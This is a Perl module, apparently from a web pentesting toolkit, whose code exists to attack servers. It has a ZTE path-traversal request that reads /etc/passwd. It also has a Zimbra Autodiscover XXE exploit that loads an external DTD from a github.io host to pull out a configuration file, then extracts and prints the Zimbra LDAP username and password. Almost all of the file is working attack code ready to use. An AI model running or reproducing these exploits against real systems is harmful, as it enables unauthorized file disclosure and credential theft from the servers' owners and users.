package webexploits;
our $VERSION = '1.0';
use Moose;
use Term::ANSIColor;
use Text::Table;
use HTML::TreeBuilder;
use LWP::UserAgent;
use HTTP::Cookies;
use URI::Escape;
use HTTP::Request;
use HTTP::Response;
use HTML::Scrubber;
use Switch;
use Parallel::ForkManager;
use utf8;
use Digest::MD5 qw(md5 md5_hex md5_base64);
binmode STDOUT, ":encoding(UTF-8)";
no warnings 'uninitialized';

{
has 'rhost', is => 'rw', isa => 'Str',default => '';	
has 'rport', is => 'rw', isa => 'Str',default => '80';	
has 'path', is => 'rw', isa => 'Str',default => '/';	
has 'proto', is => 'rw', isa => 'Str',default => 'http';	

has user_agent      => ( isa => 'Str', is => 'rw', default => '' );
has proxy_env      => ( isa => 'Str', is => 'rw', default => '' );
has debug      => ( isa => 'Int', is => 'rw', default => 0 );
has headers  => ( isa => 'Object', is => 'rw', lazy => 1, builder => '_build_headers' );
has browser  => ( isa => 'Object', is => 'rw', lazy => 1, builder => '_build_browser' );


sub exploit
{
my $self = shift;
my $headers = $self->headers;
my $debug = $self->debug;
my $rhost = $self->rhost;
my $rport = $self->rport;
my $proto = $self->proto;


my %options = @_;
my $module = $options{ module };
my $path = $options{ path };


print color('bold blue') if($debug);
print "######### Testendo: $module ##################### \n\n" if($debug);
print color('reset') if($debug);

my $url ;
if ($rport eq '80' || $rport eq '443')
	{$url = "$proto://".$rhost.$path; }
else
	{$url = "$proto://".$rhost.":".$rport.$path; }
        

 
if ($module eq "zte")
{
	my $response = $self->dispatch(url => $url."../../../../../../../../../../../../etc/passwd",method => 'GET', headers => $headers);
	my $decoded_response = $response->decoded_content;
	print "$decoded_response \n";
}

if ($module eq "zimbraXXE")
{
	
	my $xml= "<!DOCTYPE Autodiscover [
        <!ENTITY % dtd SYSTEM 'https://hackworld1.github.io/zimbraUser.dtd'>
        %dtd;
        %all;
        ]>
	<Autodiscover xmlns='http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a'>
    <Request>
        <EMailAddress>aaaaa</EMailAddress>
        <AcceptableResponseSchema>&fileContents;</AcceptableResponseSchema>
    </Request>
	</Autodiscover>";

	my $response = $self->dispatch(url => $url."Autodiscover/Autodiscover.xml",method => 'POST_FILE',post_data =>$xml,  headers => $headers);
	my $decoded_response = $response->decoded_content;
	
	$decoded_response =~ s/&gt;/>/g; 
	$decoded_response =~ s/&lt;/</g; 
	
	print "$decoded_response \n";
	
	if($decoded_response =~ /ldap_root_password/m){	 		
		$decoded_response =~ /name=&quot;zimbra_user&quot;>\n    <value>(.*?)</;
		my $username = $1; 
	
		$decoded_response =~ /name=&quot;zimbra_ldap_password&quot;>\n    <value>(.*?)</;
		my $password = $1; 
			
		print "Credenciales: Usuario: $username password: $password\n";
	}
}

}



################################### build objects ########################

################### build headers object #####################
sub _build_headers {   
my $self = shift;
my $debug = $self->debug;
my $headers = HTTP::Headers->new;


my @user_agents=( "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.62 Safari/537.36",
			  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:23.0) Gecko/20100101 Firefox/23.0",
			  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31",
			  "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.62 Safari/537.36");			   
			  
my $user_agent = @user_agents[rand($#user_agents+1)];    
print "user_agent $user_agent \n" if ($debug);

$headers->header('User-Agent' => "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36"); 
$headers->header('Accept' => '*/*'); 
$headers->header('Connection' => 'close'); 
$headers->header('Cache-Control' => 'max-age=0'); 
$headers->header('DNT' => '1'); 

return $headers; 
}


###################################### internal functions ###################

sub dispatch {    
my $self = shift;
my $debug = $self->debug;
my %options = @_;

my $url = $options{ url };
my $method = $options{ method };
my $headers = $options{ headers };
my $response;

    
if ($method eq 'GET')
  { my $req = HTTP::Request->new(GET => $url, $headers);
    $response = $self->browser->request($req)
  }

if ($method eq 'OPTIONS')
  { my $req = HTTP::Request->new(OPTIONS => $url, $headers);
    $response = $self->browser->request($req)
  }  
  
if ($method eq 'POST')
  {     
   my $post_data = $options{ post_data };           
   my $req = HTTP::Request->new(POST => $url, $headers);
   $req->content($post_data);
   $response = $self->browser->request($req);  
  }  
  
if ($method eq 'POST_MULTIPART')
  {    	   
   my $post_data = $options{ post_data }; 
   $headers->header('Content_Type' => 'multipart/form-data');
    my $req = HTTP::Request->new(POST => $url, $headers);
   $req->content($post_data);
   $response = $self->browser->request($req);    
  } 

if ($method eq 'POST_FILE')
  { 
	my $post_data = $options{ post_data };         	    
	$headers->header('Content_Type' => 'application/xml');
    my $req = HTTP::Request->new(POST => $url, $headers);
    $req->content($post_data);    
    $response = $self->browser->request($req);    
  }  
      
  
return $response;
}

################### build browser object #####################	
sub _build_browser {    

	my $self = shift;
	my $rhost = $self->rhost;
	my $rport = $self->rport;
	my $proto = $self->proto;

	my $debug = $self->debug;
	# burpsuite
	#$ENV{http_proxy}  = 'http://127.0.0.1:8080';
	#$ENV{https_proxy} = 'http://127.0.0.1:8080';

	print "building browser \n" if ($debug);
	
	my $browser = LWP::UserAgent->new( max_redirect => 5, env_proxy => 1,keep_alive => 1, timeout => 15, agent => "Mozilla/4.76 [en] (Win98; U)",ssl_opts => { verify_hostname => 0 ,  SSL_verify_mode => 0});
	$browser->cookie_jar(HTTP::Cookies->new());
	$browser->show_progress(1) if ($debug);
	return $browser;     
}
    
}
1;

